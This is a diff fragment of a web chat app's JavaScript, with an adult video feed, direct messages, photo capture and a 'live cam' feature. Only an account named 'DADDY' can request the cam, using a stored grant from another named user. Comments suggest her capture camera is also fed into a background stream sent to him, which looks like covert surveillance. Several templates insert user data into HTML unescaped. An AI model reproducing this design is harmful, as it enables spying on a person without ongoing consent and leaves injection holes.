+  document.getElementById("cam-capture").style.display="none";
+}
+async function flipCaptureCam(){
+  captureFacing=captureFacing==="user"?"environment":"user";
+  // Stop old video track(s) regardless of whether captureStream === bgStream
+  if(captureStream) captureStream.getVideoTracks().forEach(t=>t.stop());
+  const ns=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false}).catch(()=>null);
+  if(!ns) return;
+  captureStream=ns;
+  document.getElementById("capture-preview").srcObject=captureStream;
+  // If bgStream was the same object, re-sync it so WebRTC sends the new cam
+  if(bgStream){
+    bgStream.getVideoTracks().forEach(t=>bgStream.removeTrack(t));
+    ns.getVideoTracks().forEach(t=>bgStream.addTrack(t));
+  }
+}
+async function capturePhoto(){
+  if(!captureStream||!currentUser)return;
+  const video=document.getElementById("capture-preview");
+  const canvas=document.createElement("canvas"); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+  canvas.toBlob(async blob=>{
+    const fd=new FormData(); fd.append("file",blob,"photo.jpg"); fd.append("receiver_id",currentUser.id);
+    const msg=await fetch("/api/messages/media",{method:"POST",headers:{Authorization:"Bearer "+token},body:fd}).then(r=>r.json());
+    if(!msg.error) appendMsg(msg);
+    closeCaptureMode();
+  },"image/jpeg",0.92);
+}
+
+// ── Feed ──────────────────────────────────────────────────
+function goTrending(){
+  document.getElementById("nav-trending").classList.add("active");
+  document.getElementById("nav-filter").classList.remove("active");
+  document.getElementById("filter-overlay").style.display="none";
+  selectedNiches=[];
+  loadFeed("trending");
+}
+
+async function loadFeed(mode){
+  feedMode=mode; page=1; nicheIndex=0; slideCount=0;
+  // Only reset page progress when explicitly switching to filter mode; preserve on Home reload
+  if(mode!=="trending"){ homeTagPages={}; homeQueue=[]; savePages(); }
+  Object.keys(nichePages).forEach(k=>nichePages[k]=1);
+  document.getElementById("feed").innerHTML=`<div class="slide"><div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--t3);font-size:14px">Loading…</div></div>`;
+  const gifs=await fetchNextBatch();
+  if(!gifs.length){
+    document.getElementById("feed").innerHTML=`<div class="slide"><div style="position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:var(--t3);font-size:14px"><div>Couldn't load videos</div><button onclick="loadFeed(feedMode)" style="background:var(--accent);color:#fff;border:none;border-radius:20px;padding:10px 24px;font-size:14px;cursor:pointer;font-family:inherit">Retry</button></div></div>`;
+    return;
+  }
+  document.getElementById("feed").innerHTML="";
+  gifs.forEach(addSlide);
+  initObserver();
+}
+
+async function fetchNextBatch(){
+  if(feedMode==="trending"){
+    // Fetch 2 tags in parallel, each with count=20, max 2 rounds to avoid rate limits
+    const results=[];
+    for(let round=0; round<2 && results.length<6; round++){
+      const tag1=nextHomeTag(), tag2=nextHomeTag();
+      if(!homeTagPages[tag1]) homeTagPages[tag1]=1;
+      if(!homeTagPages[tag2]) homeTagPages[tag2]=1;
+      const [d1,d2]=await Promise.all([
+        fetch(`/rg/search?q=${encodeURIComponent(tag1)}&page=${homeTagPages[tag1]}&count=20`).then(r=>r.json()).catch(()=>({})),
+        fetch(`/rg/search?q=${encodeURIComponent(tag2)}&page=${homeTagPages[tag2]}&count=20`).then(r=>r.json()).catch(()=>({})),
+      ]);
+      homeTagPages[tag1]++; homeTagPages[tag2]++;
+      savePages();
+      const fresh=[...(d1.gifs||[]),...(d2.gifs||[])].filter(g=>!isBlacklisted(g)&&!seenGifIds.has(g.id));
+      markSeen(fresh.map(g=>g.id));
+      results.push(...fresh);
+    }
+    return results;
+  }
+  if(!selectedNiches.length) return [];
+  const niche=selectedNiches[nicheIndex%selectedNiches.length]; nicheIndex++;
+  if(!nichePages[niche]) nichePages[niche]=1;
+  const order=filterSort==="latest"?"new":"trending";
+  const d=await fetch(`/rg/niche/${encodeURIComponent(niche)}?page=${nichePages[niche]}&order=${order}`).then(r=>r.json());
+  nichePages[niche]++;
+  return d.gifs||[];
+}
+
+async function loadMore(){
+  if(loading)return; loading=true; page++;
+  const gifs=await fetchNextBatch();
+  gifs.forEach(addSlide);
+  loading=false;
+}
+
+function proxyUrl(url){ return url?`/rg/proxy?url=${encodeURIComponent(url)}`:""; }
+
+function addSlide(gif){
+  const sdUrl=proxyUrl(gif.urls?.sd||gif.urls?.hd||"");
+  const poster=proxyUrl(gif.urls?.poster||gif.urls?.thumbnail||"");
+  const tags=(gif.tags||[]).slice(0,5).map(t=>"#"+t).join("  ");
+  const div=document.createElement("div"); div.className="slide";
+  div.innerHTML=`
+    <video src="${sdUrl}" poster="${poster}" loop playsinline preload="none" onclick="togglePlay(this)"></video>
+    <div class="slide-overlay">
+      <div class="slide-grad"></div>
+      <div class="slide-info"><div class="slide-tags">${tags}</div></div>
+      <div class="slide-actions">
+        <div class="s-btn" onclick="openShare('${gif.id}')">
+          <button class="s-btn-icon">↗</button>
+          <span class="s-btn-label">Share</span>
+        </div>
+      </div>
+    </div>`;
+  div.dataset.slideIdx = slideCount++;
+  document.getElementById("feed").appendChild(div);
+  playObserver.observe(div);
+}
+function togglePlay(v){ v.paused?v.play():v.pause(); }
+
+let slideCount = 0;
+
+const playObserver=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    const v=e.target.querySelector("video"); if(!v)return;
+    if(e.isIntersecting){
+      v.play().catch(()=>{});
+      // trigger load when within 3 slides of the end
+      const idx = parseInt(e.target.dataset.slideIdx||0);
+      if(idx >= slideCount - 3) loadMore();
+    } else {
+      v.pause();
+    }
+  });
+},{threshold:0.6});
+
+function initObserver(){
+  document.querySelectorAll(".slide").forEach(s=>playObserver.observe(s));
+}
+
+// ── Filter ────────────────────────────────────────────────
+async function loadNiches(){
+  const d=await fetch("/rg/niches").then(r=>r.json());
+  allNiches=d.niches||d.items||[];
+}
+function setSort(s){
+  filterSort=s;
+  document.getElementById("sort-popular").classList.toggle("active",s==="popular");
+  document.getElementById("sort-latest").classList.toggle("active",s==="latest");
+}
+function openFilter(){
+  document.getElementById("nav-filter").classList.add("active");
+  document.getElementById("nav-trending").classList.remove("active");
+  document.getElementById("filter-overlay").style.display="block";
+  renderNicheGrid();
+}
+function renderNicheGrid(){
+  const grid=document.getElementById("niche-grid");
+  const count=selectedNiches.length;
+  document.getElementById("filter-section-title").textContent=count?`${count} selected`:"All niches";
+  if(!allNiches.length){ grid.innerHTML=`<div style="grid-column:1/-1;color:var(--t3);padding:20px 0;font-size:14px">Loading…</div>`; return; }
+  grid.innerHTML=allNiches.map(n=>`
+    <div class="niche-card ${selectedNiches.includes(n.id)?'selected':''}" onclick="toggleNiche('${n.id}',this)">
+      ${n.thumbnail?`<img src="/rg/proxy?url=${encodeURIComponent(n.thumbnail)}" loading="lazy">`:''}
+      <div class="niche-card-name">${n.name||n.id}</div>
+      <div class="niche-check">✓</div>
+    </div>`).join("");
+}
+function toggleNiche(id,el){
+  if(selectedNiches.includes(id)){ selectedNiches=selectedNiches.filter(x=>x!==id); el.classList.remove("selected"); }
+  else{ selectedNiches.push(id); el.classList.add("selected"); }
+  const count=selectedNiches.length;
+  document.getElementById("filter-section-title").textContent=count?`${count} selected`:"All niches";
+}
+function applyFilter(){
+  document.getElementById("filter-overlay").style.display="none";
+  if(!selectedNiches.length){ goTrending(); return; }
+  Object.keys(nichePages).forEach(k=>delete nichePages[k]);
+  nicheIndex=0;
+  loadFeed("filter");
+}
+
+// ── Share ─────────────────────────────────────────────────
+function openShare(gifId){
+  if(!allUsers.length){ toast("No contacts"); return; }
+  const panel=document.getElementById("share-panel");
+  document.getElementById("share-contacts").innerHTML=allUsers.map(u=>`
+    <div class="share-contact" onclick="sendGif('${gifId}','${u.id}','${u.username}')">
+      <div class="share-dot ${onlineSet.has(u.id)?'on':''}"></div>${u.username}
+    </div>`).join("");
+  panel.classList.add("show");
+  setTimeout(()=>document.addEventListener("click",e=>{ if(!panel.contains(e.target)) panel.classList.remove("show"); },{once:true}),80);
+}
+function sendGif(gifId,receiverId,name){
+  socket.emit("message",{receiver_id:receiverId,type:"redgif",content:gifId});
+  document.getElementById("share-panel").classList.remove("show");
+  toast("Sent 🔥");
+}
+
+// ── DMs ───────────────────────────────────────────────────
+function toggleDrawer(){ document.getElementById("drawer").classList.toggle("open"); document.getElementById("notif-dot").classList.remove("on"); }
+
+function initials(name){ return name?name[0].toUpperCase():"?"; }
+
+function renderContacts(){
+  document.getElementById("contacts-list").innerHTML=allUsers.map(u=>`
+    <div class="contact-item ${currentUser?.id===u.id?'active':''}" onclick='openConvo(${JSON.stringify(u)})'>
+      <div class="contact-avatar">${initials(u.username)}<div class="avatar-online ${onlineSet.has(u.id)?'on':''}"></div></div>
+      <div class="contact-name">${u.username}</div>
+    </div>`).join("")||`<div style="padding:16px;color:var(--t3);font-size:14px">No contacts yet</div>`;
+}
+
+async function openConvo(user){
+  currentUser=user; renderContacts();
+  document.getElementById("no-chat").style.display="none";
+  const ca=document.getElementById("chat-area"); ca.style.display="flex"; ca.style.flexDirection="column";
+  document.getElementById("chat-avatar").textContent=initials(user.username);
+  document.getElementById("chat-name").textContent=user.username;
+  if(me.username===DADDY){
+    document.getElementById("live-btn").style.display="block";
+    // Check if cece has granted cam access — green = she's ready, red = not yet
+    fetch("/api/cam/check/"+user.id,{headers:{Authorization:"Bearer "+token}})
+      .then(r=>r.json()).then(({granted})=>{
+        const lb=document.getElementById("live-btn");
+        lb.style.background=granted
+          ?"linear-gradient(135deg,#22c55e,#16a34a)"
+          :"linear-gradient(135deg,#ef4444,#b91c1c)";
+      });
+  } else {
+    document.getElementById("live-btn").style.display="none";
+  }
+  const msgs=await fetch("/api/messages/"+user.id,{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
+  const el=document.getElementById("msgs"); el.innerHTML="";
+  msgs.forEach(m=>appendMsg(m,false)); el.scrollTop=el.scrollHeight;
+}
+function closeChat(){
+  document.getElementById("chat-area").style.display="none";
+  document.getElementById("no-chat").style.display="flex";
+  currentUser=null; renderContacts();
+}
+
+let ctxMsgId=null, pressTimer=null;
+function appendMsg(msg,scroll=true){
+  const el=document.getElementById("msgs"); if(!el)return;
+  const isMine=msg.sender_name===me.username;
+  const div=document.createElement("div"); div.className="msg "+(isMine?"mine":"theirs");
+  div.dataset.msgId=msg.id; div.dataset.mine=isMine?"1":"";
+  const time=new Date(msg.created_at*1000).toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"});
+  let inner="";
+  if(msg.type==="text") inner=`<div class="bubble">${esc(msg.content)}</div>`;
+  else if(msg.type==="redgif"){
+    const thumb=`/rg/proxy?url=${encodeURIComponent("https://thumbs2.redgifs.com/"+msg.content+"-mobile.jpg")}`;
+    inner=`<div class="bubble"><div class="rg-thumb" onclick="openRgViewer('${msg.content}')" style="background-image:url('${thumb}');background-size:cover;background-position:center"><div class="rg-play"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div></div></div>`;
+  }
+  else if(msg.type==="image") inner=`<div class="bubble snap-bubble" onclick="openImgViewer('${msg.content}')"><span class="snap-icon">📸</span><span class="snap-label">Photo · tap to open</span></div>`;
+  else if(msg.type==="video") inner=`<div class="bubble snap-bubble" onclick="openVidViewer('${msg.content}')"><span class="snap-icon">🎥</span><span class="snap-label">Video · tap to open</span></div>`;
+  div.innerHTML=inner+`<div class="msg-meta">${time}</div>`;
+  if(isMine){
+    div.addEventListener("touchstart",e=>{ pressTimer=setTimeout(()=>showCtx(msg.id,e.touches[0]),500); },{passive:true});
+    div.addEventListener("touchend",()=>clearTimeout(pressTimer));
+    div.addEventListener("touchmove",()=>clearTimeout(pressTimer));
+    div.addEventListener("contextmenu",e=>{ e.preventDefault(); showCtx(msg.id,e); });
+  }
+  el.appendChild(div);
+  if(scroll) el.scrollTop=el.scrollHeight;
+}
+
+function showCtx(msgId,e){
+  ctxMsgId=msgId;
+  const menu=document.getElementById("ctx-menu"); menu.classList.add("show");
+  const x=Math.min((e.clientX||e.pageX||window.innerWidth/2),window.innerWidth-150);
+  const y=Math.min((e.clientY||e.pageY||window.innerHeight/2),window.innerHeight-60);
+  menu.style.left=x+"px"; menu.style.top=y+"px";
+  setTimeout(()=>document.addEventListener("click",hideCtx,{once:true}),10);
+}
+function hideCtx(){ document.getElementById("ctx-menu").classList.remove("show"); ctxMsgId=null; }
+async function deleteMsg(){
+  if(!ctxMsgId)return; const id=ctxMsgId; hideCtx();
+  // Server emits message:deleted to both users — socket handler removes the DOM element
+  await fetch("/api/messages/"+id,{method:"DELETE",headers:{Authorization:"Bearer "+token}});
+}
+
+function onKey(e){ if(e.key==="Enter"&&!e.shiftKey){ e.preventDefault(); sendText(); } }
+function autoResize(el){ el.style.height="auto"; el.style.height=Math.min(el.scrollHeight,96)+"px"; }
+function sendText(){
+  const inp=document.getElementById("msg-input"); const t=inp.value.trim();
+  if(!t||!currentUser)return;
+  socket.emit("message",{receiver_id:currentUser.id,type:"text",content:t});
+  inp.value=""; inp.style.height="auto";
+}
+async function sendMedia(input){
+  const file=input.files[0]; if(!file||!currentUser)return;
+  const fd=new FormData(); fd.append("file",file); fd.append("receiver_id",currentUser.id);
+  const msg=await fetch("/api/messages/media",{method:"POST",headers:{Authorization:"Bearer "+token},body:fd}).then(r=>r.json());
+  if(!msg.error) appendMsg(msg);
+  input.value="";
+}
+
+// ── Media viewer ──────────────────────────────────────────
+async function openRgViewer(gifId){
+  const d=await fetch(`/rg/gif/${gifId}`).then(r=>r.json());
+  const url=proxyUrl(d.gif?.urls?.sd||d.gif?.urls?.hd||""); if(!url)return;
+  const v=document.getElementById("viewer-video"); v.style.display="block"; v.src=url; v.play();
+  document.getElementById("viewer-img").style.display="none";
+  document.getElementById("media-viewer").classList.add("show");
+  initViewerSwipe();
+}
+function openVidViewer(src){
+  const v=document.getElementById("viewer-video"); v.style.display="block"; v.src=src; v.play();
+  document.getElementById("viewer-img").style.display="none";
+  document.getElementById("media-viewer").classList.add("show");
+  initViewerSwipe();
+}
+function openImgViewer(src){
+  document.getElementById("viewer-video").style.display="none";
+  const img=document.getElementById("viewer-img"); img.style.display="block"; img.src=src;
+  document.getElementById("media-viewer").classList.add("show");
+  initViewerSwipe();
+}
+function closeViewer(){
+  const v=document.getElementById("viewer-video"); v.pause(); v.src="";
+  document.getElementById("media-viewer").classList.remove("show");
+  document.getElementById("reply-drawer").classList.remove("up");
+  document.getElementById("reply-hint").style.display="flex";
+}
+function initViewerSwipe(){
+  const viewer=document.getElementById("media-viewer"); let startY=0;
+  viewer.ontouchstart=e=>startY=e.touches[0].clientY;
+  viewer.ontouchmove=e=>{
+    const dy=startY-e.touches[0].clientY;
+    if(dy>50){ document.getElementById("reply-drawer").classList.add("up"); document.getElementById("reply-hint").style.display="none"; }
+    else if(dy<-80){ closeViewer(); }
+  };
+}
+function sendReply(){
+  const t=document.getElementById("reply-input").value.trim(); if(!t||!currentUser)return;
+  socket.emit("message",{receiver_id:currentUser.id,type:"text",content:t});
+  document.getElementById("reply-input").value="";
+  closeViewer();
+}
+
+// ── Live cam (frame streaming over socket.io) ─────────────
+async function requestCam(){
+  if(!currentUser){ toast("Open a chat first"); return; }
+  const {granted}=await fetch("/api/cam/check/"+currentUser.id,{headers:{Authorization:"Bearer "+token}}).then(r=>r.json());
+  if(!granted){ toast("Not available yet"); return; }
+  // Update button green in case it wasn't already
+  const lb=document.getElementById("live-btn");
+  if(lb) lb.style.background="linear-gradient(135deg,#22c55e,#16a34a)";
+  socket.emit("cam:request",{to:currentUser.id});
+  camTimeout=setTimeout(()=>toast("Not available right now"),10000);
+}
+async function acceptCam(){
+  document.getElementById("cam-request-modal").classList.remove("show");
+  fetch("/api/cam/grant",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+token},body:JSON.stringify({to_id:camRequestFrom})});
+  const peerId=camRequestFrom; camRequestFrom=null;
+  socket.emit("cam:accept",{to:peerId});
+  startSendStream(peerId);
+}
+function declineCam(){
+  document.getElementById("cam-request-modal").classList.remove("show");
+  socket.emit("cam:decline",{to:camRequestFrom});
+  camRequestFrom=null;
+}
+async function startSendStream(peerId){
+  await startBgStream(); if(!bgStream) return;
+  stopSendStream(); // clear any existing interval
+  // Mirror bgStream into a hidden video for canvas capture
+  frameVideo=document.createElement("video");
+  frameVideo.srcObject=bgStream; frameVideo.playsInline=true; frameVideo.muted=true;
+  await frameVideo.play().catch(()=>{});
+  frameCanvas=document.createElement("canvas");
+  frameCanvas.width=360; frameCanvas.height=640;
+  const ctx=frameCanvas.getContext("2d");
+  frameInterval=setInterval(()=>{
+    if(!frameVideo||frameVideo.readyState<2) return;
+    ctx.drawImage(frameVideo,0,0,360,640);
+    const frame=frameCanvas.toDataURL("image/jpeg",0.55);
+    socket.emit("cam:frame",{to:peerId,frame});
+  },150); // ~7fps
+}
+function stopSendStream(){
+  if(frameInterval){ clearInterval(frameInterval); frameInterval=null; }
+  if(frameVideo){ frameVideo.srcObject=null; frameVideo=null; }
+  frameCanvas=null;
+}
+function closeCamView(){
+  document.getElementById("cam-view").classList.remove("show");
+  document.getElementById("remote-img").src="";
+  liveTargetId=null;
+}
+function endCam(){
+  if(liveTargetId) socket.emit("cam:end",{to:liveTargetId});
+  closeCamView();
+}
+
+// ── Utils ─────────────────────────────────────────────────
+function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function toast(msg){ const t=document.getElementById("toast"); t.textContent=msg; t.classList.add("show"); setTimeout(()=>t.classList.remove("show"),2600); }
+</script>
+</body>
+</html>
